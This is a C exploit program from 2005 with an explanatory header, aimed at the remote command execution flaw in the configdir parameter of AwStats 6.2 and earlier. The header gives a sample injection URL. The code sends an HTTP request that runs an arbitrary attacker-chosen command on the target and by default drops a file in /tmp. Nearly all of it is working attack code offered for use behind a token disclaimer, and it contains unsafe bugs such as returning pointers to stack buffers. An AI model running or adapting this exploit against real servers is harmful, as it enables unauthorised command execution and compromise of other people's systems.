/*
AwStats exploit by Thunder, molnar_rcs@yahoo.com

This exploit makes use of the remote command execution bug discovered in
AwStats ver 6.2 and below. The bug resides in the awstats.pl perl script.
The script does not sanitise correctly the user input for the
`configdir` parameter. If the users sends a command prefixed and postfixed
with | , the command will be executed. An example would be:

Let's execute '/usr/bin/w':
>
http://localhost/cgi-bin/awstats.pl?configdir=%20|%20/usr/bin/w%20|%20
<

Awstat output:
>
Error: LogFile parameter is not defined in config/domain file
Setup (' | /usr/bin/w | /awstats.localhost.conf' file, web server or permissions) may be wrong.
Check config file, permissions and AWStats documentation (in 'docs' directory).
<

That's it. Our command was executed.
This bug is fixed in AwStats ver 6.3 and a patch was released for all versions, but vulnerable
AwStat is still available for download on several sites (ex. www.topshareware.com).

Type `gcc awexpl.c - o awexpl` to compile the exploit and `./awexpl -u` for usage.

Note:
Just indexing the commands with | will not always work, or might not work at all. I checked
it on my own awstats 6.0 install, and it failed. So, whoever tried the same on his own
script and was surprised to see that (although the version he uses is said to be prone to the
remote command execution bug) nothing happened, should patch or upgrade to Awstat 6.3 asap.
As far as i know all unpached versions prior to 6.3 are vulnerable and commands prefixed and
postfixed by a | character WILL be executed. Beware!

Oh, I almost forgot, the disclaimer :)

THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
AND WITHOUT ANY WARRANTY.

Robert Molnar,
21th jan 2005
*/




#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
//#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

void usage(char *pname)
 {
  printf("# AWStats exploit by Thunder, molnar_rcs@yahoo.com\n"
	 "# Usage: %s -h <host> -i <ip> [-s Script] [-p Path] [-o Port] [-c Commands] [-u]\n"
	 "\t-h : target host name, default is `localhost`\n"
	 "\t-i : target IP (to wich host name resolvs)\n"
	 "\t-s : script name, default is `awstats.pl`\n"
	 "\t-p : script path, default is `/cgi-bin`\n"
	 "\t-o : specify port to connect to, default is `80`\n"
	 "\t-c : specify commands to be executed, the exploit will create a\n"
	 "\t   : file named `OWNED` in `/tmp` by default\n"
	 "\t-u : usage\n\n"
	 "# Example: %s -h localhost -i 127.0.0.1\n"
	 "#        : %s -h localhost -i 127.0.0.1 -p /~user/cgi-bin\n"
	 "#        : %s -h localhost -i 127.0.0.1 -p /~user/cgi-bin -c \"/usr/bin/id\"\n"
	 , pname, pname, pname, pname);

  exit(0);
 }

  char * urlEncode(char *inC)
  {
	int c, i, j = 0;
	char *h = "0123456789abcdef";
	char retval[1024], res[3072];
	memcpy(retval, inC, strlen(inC));
	retval[strlen(inC)] = '\0';
	for(i=0; i < strlen(inC); i++){
		c = retval[i];
		if( 'a' <= c && c <= 'z'
		|| 'A' <= c && c <= 'Z'
		|| '0' <= c && c <= '9'
		|| c == '-' || c == '_' || c == '.')
		res[j++] = c;
		else {
			res[j++] = '%';
			res[j++] = h[c >> 4];
			res[j++] = h[c & 0x0f];
		}
	}
   return res;

  }


 char *buildHeader(char *Xhost, char *Xpath,char *Xscript, char *exeCmd)
 {
  char Header[5196];

  sprintf( Header,
  	   "GET %s/%s?configdir=%s HTTP/1.1\r\n"
	   "Accept: text/xml,application/xml,application/xhtml+xml,"
	   "text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,"
	   "image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\r\n"
	   "Accept-Language: en-us\r\n"
	   "Accept-Encoding: deflate, gzip\r\n"
	   "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)\r\n"
	   "Host: %s\r\n"
	   "Connection: Keep-Alive\r\n"
	   "Cache-Control: no-cache\r\n"
	   "\r\n"
	   , Xpath, Xscript, urlEncode(exeCmd), Xhost );
  return Header;
 }


void exploit(char *Xhost, char *Xpath,char *Xscript, char *exeCmd, char *Xip, int Xport)
 {
   int sock, disp = 0, count = 0;
   struct sockaddr_in sockaddrX;
   char *oData, iData;

   printf("# AWStats Exploit by Thunder, molnar_rcs@yahoo.com\n");
   sockaddrX.sin_port = htons(Xport);
   sockaddrX.sin_family = AF_INET;
   sockaddrX.sin_addr.s_addr = inet_addr(Xip);
   if(Xhost == "localhost")
    {
     printf("# Using hardcoded (default) options, use `-u` for usage\n"
            );
    }
   printf("# Connecting to %s (%s) ...", Xhost, Xip);
   sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (connect(sock, (struct sockaddr*)&sockaddrX, 16) < 0)
    {
       printf("\n# Connect to %s (%s) on port %i failed!\n", Xhost, Xip, Xport);
       exit(-1);
    }
   printf("Done!\n# Building header...");
   oData = buildHeader(Xhost, Xpath, Xscript, exeCmd);
   printf("Done!\n# Sending data...");
   send(sock, oData, strlen(oData), 0);

   /* the code below reads the server response byte by byte, this is not needed
   while(read(sock, &iData, 1))
     putchar(iData);
   */
   printf("Done!\n# Exploit finished.\n");
   close(sock);
 }





int main(int argc, char * argv[])
 {
 extern char *optarg;
 extern int optind, optopt;

 int  c,
      Xport 	= 80,
      isgood	= 0;

 char *Xhost	= "localhost" ,
      *Xip	= "127.0.0.1",
      *Xscript 	= "awstats.pl",
      *Xpath 	= "/cgi-bin";

 char exeCmd[1024] = "| echo \"You have been Owned, update AWstat or patch\" > /tmp/OWNED | ";

 while ((c = getopt(argc, argv, ":uh:i:s:p:c:o:")) != -1)
   {

     switch(c)
       {
	case 'h':
		Xhost = optarg;
		isgood++;
		break;

        case 'i':
		Xip = optarg;
		isgood++;
		break;

        case 's':
		Xscript = optarg;
		break;

        case 'p':
		Xpath = optarg;
		break;

        case 'c':
	 	if(strlen(optarg) > 1018)
		 {
		  printf("# `-c` argument can't exceed 1024 bytes (command to long)");
		  exit(0);
		 }
		sprintf(exeCmd, " | %s | ", optarg);
		break;

	case 'o':
		Xport = atoi(optarg);
		break;

        case 'u':
		usage(argv[0]);
		break;

	case '?':
		printf("# Unknown option `-%c`\n", optopt);
		break;


       }
   }


 if( isgood == 1)
  {
   printf("# Please specify both host `-h` and ip `-i`\n");
   exit(0);
  }

 exploit(Xhost, Xpath, Xscript, exeCmd, Xip, Xport);
 return 0;
}
